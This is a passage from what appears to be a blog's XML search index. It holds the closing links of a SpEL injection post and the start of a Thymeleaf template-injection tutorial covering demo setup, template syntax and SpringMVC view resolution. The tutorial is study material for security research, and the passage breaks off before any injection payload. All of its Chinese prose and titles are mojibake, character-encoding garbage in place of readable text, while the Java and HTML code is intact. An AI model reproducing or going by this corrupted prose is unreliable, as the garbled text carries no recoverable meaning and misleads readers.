href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/01.%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/10.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/01.%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/10.spel%E8%A1%A8%E8%BE%BE%E5%BC%8F</a></p><p><a href="https://jishu.dev/2021/05/23/spring-expression-language/">https://jishu.dev/2021/05/23/spring-expression-language/</a></p><p><a href="http://www.bmth666.cn/2023/04/15/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">http://www.bmth666.cn/2023/04/15/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html</a></p><p><a href="https://dragonkeeep.top/category/SPEL/index.html">https://dragonkeeep.top/category/SPEL/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thymeleafæ¨¡æ¿æ³¨å…¥</title>
      <link href="/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/12/13/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>æœ€è¿‘å®åœ¨æ˜¯ä¸çŸ¥é“çœ‹ä»€ä¹ˆäº†ï¼Œæ¥å­¦ä¸€ä¸‹å’Œjavaç›¸å…³çš„ä¸€äº›sstiå§ï¼Œå…ˆä»thymeleafå¼€å§‹</p><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>Thymeleafå°±æ˜¯ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“å¼•æ“ï¼Œå’Œpythonçš„jinjia2ä¸€æ ·ï¼Œå°±ä¸éœ€è¦è¿‡å¤šä»‹ç»äº†</p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.thymeleaf.org/documentation.html">https://www.thymeleaf.org/documentation.html</a></p><p>é«˜ç‰ˆæœ¬SpringBoot&#x2F;Thymeleafä¸å­˜åœ¨æ¨¡æ¿æ³¨å…¥é—®é¢˜ï¼Œè¿™é‡ŒSpringBootç‰ˆæœ¬ä¸º2.5.10(å®æµ‹å¾—2.4.1ï¼Œ2.5.10å·²ç»ä¸è¡Œäº†)ï¼ŒThymeleafåŒä¸Š</p><h1 id="demoç¤ºä¾‹"><a href="#Demoç¤ºä¾‹" class="headerlink" title="Demoç¤ºä¾‹"></a>Demoç¤ºä¾‹</h1><p>é¦–å…ˆå°±æ˜¯åˆ›å»ºä¸€ä¸ªspringbooté¡¹ç›®ï¼Œæˆ‘ä»¬çš„thymeleafæ–‡ä»¶å°±å†™åœ¨templatesç›®å½•ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241213110130755.png" alt="image-20241213110130755"></p><p>åˆ›å»ºé¡¹ç›®çš„æ—¶å€™å¯ä»¥å‹¾é€‰thymeleafæ¨¡æ¿å¼•æ“</p><p><img src="https://cdn.clown2024.cn/image-20241213110353299.png" alt="image-20241213110353299"></p><p>ä¸€ä¸ªåŸºç¡€çš„index.html</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>hello ç¬¬ä¸€ä¸ªThymeleafç¨‹åº<br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;name&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>controller</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller.thymeleaf;<br><br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.ui.Model;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/demo&quot;)</span><br><span class="hljs-comment">//    @ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">demo</span><span class="hljs-params">(Model model)</span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;clown&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦ç”¨<code>@Controller</code>æ³¨è§£æ‰è¡Œï¼Œå› ä¸ºè¯¥æ³¨è§£ä¸»è¦ä½œç”¨æ˜¯è¿”å›è§†å›¾åç§°ï¼Œè¿™äº›è§†å›¾åç§°ä¼šè¢«Springçš„è§†å›¾è§£æå™¨ï¼ˆView Resolverï¼‰è§£æï¼Œä»è€Œæ‰¾åˆ°å¯¹åº”çš„æ¨¡æ¿æ–‡ä»¶ï¼ˆå¦‚Thymeleafæ¨¡æ¿ï¼‰ï¼Œå¹¶å°†æ¨¡å‹æ•°æ®æ¸²æŸ“åˆ°æ¨¡æ¿ä¸­ï¼Œæœ€ç»ˆç”Ÿæˆå“åº”ç»™å®¢æˆ·ç«¯çš„è§†å›¾ã€‚</p><p><code>@RestController</code>æ³¨è§£æ˜¯<code>@Controller</code>å’Œ<code>@ResponseBody</code>çš„ç»„åˆï¼Œå®ƒé€šå¸¸ç”¨äºåˆ›å»ºRESTful WebæœåŠ¡ã€‚<code>@RestController</code>æ³¨è§£çš„æ§åˆ¶å™¨æ–¹æ³•çš„è¿”å›å€¼ä¼šè‡ªåŠ¨ä½œä¸ºHTTPå“åº”çš„æ­£æ–‡è¿”å›ï¼Œè¿™æ„å‘³ç€è¿”å›å€¼ä¸ä¼šè¢«è§†å›¾è§£æå™¨å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥å†™å…¥HTTPå“åº”ä½“ä¸­ã€‚</p><h1 id="ä¸€äº›è¯­æ³•"><a href="#ä¸€äº›è¯­æ³•" class="headerlink" title="ä¸€äº›è¯­æ³•"></a>ä¸€äº›è¯­æ³•</h1><p>thymeleafçš„htmlæ–‡ä»¶é¦–å…ˆè¦åŒ…å«è¿™ä¸ª</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure><p><strong>æ ‡ç­¾</strong></p><table><thead><tr><th>æ ‡ç­¾</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>th:id</td><td>æ›¿æ¢id</td><td><code>&lt;input th:id=&quot;$&#123;user.id&#125;&quot;/&gt;</code></td></tr><tr><td>th:text</td><td>æ–‡æœ¬æ›¿æ¢</td><td><code>&lt;p text:=&quot;$&#123;user.name&#125;&quot;&gt;bigsai&lt;/p&gt;</code></td></tr><tr><td>th:utext</td><td>æ”¯æŒhtmlçš„æ–‡æœ¬æ›¿æ¢</td><td><code>&lt;p utext:=&quot;$&#123;htmlcontent&#125;&quot;&gt;content&lt;/p&gt;</code></td></tr><tr><td>th:object</td><td>æ›¿æ¢å¯¹è±¡</td><td><code>&lt;div th:object=&quot;$&#123;user&#125;&quot;&gt;&lt;/div&gt;</code></td></tr><tr><td>th:value</td><td>æ›¿æ¢å€¼</td><td><code>&lt;input th:value=&quot;$&#123;user.name&#125;&quot; &gt;</code></td></tr><tr><td>th:each</td><td>è¿­ä»£</td><td><code>&lt;tr th:each=&quot;student:$&#123;user&#125;&quot; &gt;</code></td></tr><tr><td>th:href</td><td>æ›¿æ¢è¶…é“¾æ¥</td><td><code>&lt;a th:href=&quot;@&#123;index.html&#125;&quot;&gt;è¶…é“¾æ¥&lt;/a&gt;</code></td></tr><tr><td>th:src</td><td>æ›¿æ¢èµ„æº</td><td><code>&lt;script type=&quot;text/javascript&quot; th:src=&quot;@&#123;index.js&#125;&quot;&gt;&lt;/script&gt;</code></td></tr></tbody></table><p><strong>é“¾æ¥è¡¨è¾¾å¼</strong></p><p>ä½¿ç”¨<code>@&#123;èµ„æºåœ°å€&#125;</code>å¼•å…¥èµ„æºï¼Œå¼•å…¥çš„åœ°å€å¯ä»¥åœ¨staticç›®å½•ï¼Œä¹Ÿå¯ä»¥æ˜¯äº’è”ç½‘çš„èµ„æºï¼Œæ ¼å¼å¦‚ä¸Šé¢çš„æ ‡ç­¾ç¤ºä¾‹</p><p><strong>å˜é‡è¡¨è¾¾å¼</strong></p><p>è¿™éƒ¨åˆ†ä¹Ÿæ˜¯é¡µé¢èƒ½åŠ¨æ€æ¸²æŸ“çš„æ ¸å¿ƒï¼Œå¯ä»¥ç”¨<code>$&#123;...&#125;</code>çš„å½¢å¼åœ¨modelä¸­å–å€¼ï¼Œå‰é¢çš„demoä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¾€modelä¸­æ·»åŠ äº†å±æ€§çš„é”®å€¼å¯¹</p><p>å–JavaBeanå¯¹è±¡ä½¿ç”¨<code>$&#123;å¯¹è±¡å.å¯¹è±¡å±æ€§&#125;</code>æˆ–è€…<code>$&#123;å¯¹è±¡å[&#39;å¯¹è±¡å±æ€§&#39;]&#125;</code>æ¥å–å€¼ã€‚å¦‚æœJavaBeanå†™äº†getæ–¹æ³•ä¹Ÿå¯ä»¥é€šè¿‡<code>$&#123;å¯¹è±¡.getæ–¹æ³•å&#125;</code>å–å€¼ã€‚</p><p>å–Mapå¯¹è±¡ä½¿ç”¨<code>$&#123;Mapå[&#39;key&#39;]&#125;</code>æˆ–<code>$&#123;Mapå.key&#125;</code></p><p>å–Listé›†åˆï¼šListé›†åˆæ˜¯ä¸€ä¸ªæœ‰åºåˆ—è¡¨ï¼Œéœ€è¦ä½¿ç”¨eachéå†èµ‹å€¼ï¼Œ<code>&lt;tr th:each=&quot;item:$&#123;userlist&#125;&quot;&gt;</code></p><p><strong>é€‰æ‹©å˜é‡è¡¨è¾¾å¼</strong></p><p>è¯¥è¡¨è¾¾å¼çš„å†™æ³•ä¸º*{â€¦}ï¼Œå†™ä¸ªä¾‹å­å°±æ˜ç™½äº†</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:object</span>=<span class="hljs-string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;name&#125;&quot;</span>&gt;</span>èµ›<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;age&#125;&quot;</span>&gt;</span>18<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Detail: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;*&#123;detail&#125;&quot;</span>&gt;</span>å¥½å¥½å­¦ä¹ <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/user&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">user</span><span class="hljs-params">(Model model)</span>&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;clown&quot;</span>, <span class="hljs-number">18</span>, <span class="hljs-string">&quot;hello&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;user&quot;</span>,user);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213143906940.png" alt="image-20241213143906940"></p><p><strong>æ¶ˆæ¯è¡¨è¾¾å¼</strong></p><p>æ–‡æœ¬å¤–éƒ¨åŒ–æ˜¯ä»æ¨¡æ¿æ–‡ä»¶ä¸­æå–æ¨¡æ¿ä»£ç çš„ç‰‡æ®µï¼Œä»¥ä¾¿å¯ä»¥å°†å®ƒä»¬ä¿å­˜åœ¨å•ç‹¬çš„æ–‡ä»¶(é€šå¸¸æ˜¯.propertiesæ–‡ä»¶)ä¸­,æ–‡æœ¬çš„å¤–éƒ¨åŒ–ç‰‡æ®µé€šå¸¸ç§°ä¸ºâ€œæ¶ˆæ¯â€ã€‚é€šä¿—æ˜“æ‡‚çš„æ¥è¯´<code>#&#123;â€¦&#125;</code>è¯­æ³•å°±æ˜¯ç”¨æ¥è¯»å–é…ç½®æ–‡ä»¶ä¸­æ•°æ®çš„ã€‚</p><p>è¿™é‡Œä¹Ÿå†™ä¸ªä¾‹å­æ›´å¥½ä½“ä¼šï¼Œé¦–å…ˆåœ¨templatesç›®å½•ä¸‹å»ºç«‹<code>clown.properties</code>ä¸­å†™å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">demo.nane=clown<br>demo.age=22<br>province=UnKnown<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨application.propertiesåŠ å…¥ä¸‹é¢å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">spring.messages.basename=templates/demo<br></code></pre></td></tr></table></figure><p>htmlå†…å®¹å¦‚ä¸‹</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Name: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.age&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Age: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;demo.nane&#125;&quot;</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Province: <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#&#123;province&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241213145707765.png" alt="image-20241213145707765"></p><p><strong>ç‰‡æ®µè¡¨è¾¾å¼</strong></p><p>ç‰‡æ®µè¡¨è¾¾å¼<code>~&#123;...&#125;</code>å¯ä»¥ç”¨äºå¼•ç”¨å…¬å…±çš„ç›®æ ‡ç‰‡æ®µï¼Œæ¯”å¦‚å¯ä»¥åœ¨ä¸€ä¸ª<code>template/public.html</code>ä¸­å®šä¹‰ä¸‹é¢çš„ç‰‡æ®µ,å¹¶åœ¨å¦ä¸€ä¸ªtemplateä¸­å¼•ç”¨ã€‚</p><p>å…¬å…±ç‰‡æ®µï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;copy&quot;</span>&gt;</span><br>    Â© 2011 The Good Thymes Virtual Grocery<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¼•ç”¨å…¬å…±ç‰‡æ®µï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>  <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span> &gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~&#123;public :: copy&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241213175923703.png" alt="image-20241213175923703"></p><h1 id="springmvcè§†å›¾è§£æè¿‡ç¨‹"><a href="#SpringMVCè§†å›¾è§£æè¿‡ç¨‹" class="headerlink" title="SpringMVCè§†å›¾è§£æè¿‡ç¨‹"></a>SpringMVCè§†å›¾è§£æè¿‡ç¨‹</h1><p>è§†å›¾è§£æçš„è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨Controllerå¤„ç†åï¼ŒControllerå¤„ç†ç»“æŸåä¼šå°†è¿”å›çš„ç»“æœå°è£…ä¸º<code>ModelAndView</code>å¯¹è±¡ï¼Œå†é€šè¿‡è§†å›¾è§£æå™¨<code>ViewResovler</code>å¾—åˆ°å¯¹åº”çš„è§†å›¾å¹¶è¿”å›ã€‚</p><p>ç»™ä¸€å¼ SpringMVCçš„æ‰§è¡Œæµç¨‹å›¾</p><p><img src="http://cdn.clown2024.cn/202407270110622.png" alt="image-20240727011007456"></p><p>æˆ‘ä»¬å¯ä»¥ç”¨å‰é¢çš„demoè·Ÿè¿›è°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹ä¸€ä¸‹è§†å›¾æ˜¯å¦‚ä½•è§£æçš„</p><h2 id="å°è£…modelandviewå¯¹è±¡"><a href="#å°è£…ModelAndViewå¯¹è±¡" class="headerlink" title="å°è£…ModelAndViewå¯¹è±¡"></a>å°è£…ModelAndViewå¯¹è±¡</h2><p>å…ˆèµ°åˆ°<code>ServletInvocableHandlerMethod#invokeAndHandle</code>ä¸­ï¼Œå…¶æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br><span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br>setResponseStatus(webRequest);<br><br><span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (isRequestNotModified(webRequest) || getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>disableContentCachingIfNecessary(webRequest);<br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(getResponseStatusReason())) &#123;<br>mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>mavContainer.setRequestHandled(<span class="hljs-literal">false</span>);<br>Assert.state(<span class="hljs-built_in">this</span>.returnValueHandlers != <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;No return value handlers&quot;</span>);<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>returnValue, getReturnValueType(returnValue), mavContainer, webRequest);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br><span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>logger.trace(formatErrorForReturnValue(returnValue), ex);<br>&#125;<br><span class="hljs-keyword">throw</span> ex;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›¸å…³çš„å˜é‡å€¼</p><p><img src="https://cdn.clown2024.cn/image-20241213214443799.png" alt="image-20241213214443799"></p><p>è¯¥å‡½æ•°å†…éƒ¨è¿›è¡Œäº†å¦‚ä¸‹æ“ä½œï¼š</p><ul><li><code>invokeForRequest</code>è°ƒç”¨Controlleråè·å–è¿”å›å€¼åˆ°<code>returnValue</code>ä¸­</li><li>åˆ¤æ–­<code>returnValue</code>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœæ˜¯åˆ™ç»§ç»­åˆ¤æ–­<code>RequestHandled</code>æ˜¯å¦ä¸º<code>True</code>ï¼Œéƒ½æ»¡è¶³çš„è¯è®¾ç½®<code>requestHandled</code>ä¸º<code>true</code></li><li>é€šè¿‡<code>handleReturnValue</code>æ ¹æ®è¿”å›å€¼çš„ç±»å‹å’Œè¿”å›å€¼å°†ä¸åŒçš„å±æ€§è®¾ç½®åˆ°<code>ModelAndViewContainer</code>ä¸­ã€‚</li></ul><p>è¿™é‡Œå¾€ä¸‹èµ°returnValueè¿”å›çš„æ˜¯index</p><p><img src="https://cdn.clown2024.cn/image-20241213214722184.png" alt="image-20241213214722184"></p><p>ç„¶åå†çœ‹handleReturnValueæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•åº”è¯¥å°±æ˜¯å¯¹æ¨¡æ¿è¿›è¡Œè§£æï¼Œç»§ç»­è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://cdn.clown2024.cn/image-20241213221758950.png" alt="image-20241213221758950"></p><p>è·å–ä¸€ä¸ªViewNameMethodReturnValueHandlerç„¶åç»§ç»­å¤„ç†ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/image-20241213222152893.png" alt="image-20241213222152893"></p><ul><li>åˆ¤æ–­returnValueç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦å‹ï¼Œè®¾ç½®<code>mavContainer.viewName</code></li><li>åˆ¤æ–­returnValueæ˜¯å¦ä»¥<code>redirect:</code>å¼€å¤´ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™è®¾ç½®é‡å®šå‘çš„å±æ€§</li></ul><p>ç„¶åè¿”å›åˆ°RequestMappingHandlerAdapter#invokeHandlerMethodæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/image-20241213222951397.png" alt="image-20241213222951397"></p><p>é€šè¿‡getModelAndViewæ–¹æ³•è¿”å›ModelAndView</p><h2 id="è·å–modelandviewè§†å›¾"><a href="#è·å–ModelAndViewè§†å›¾" class="headerlink" 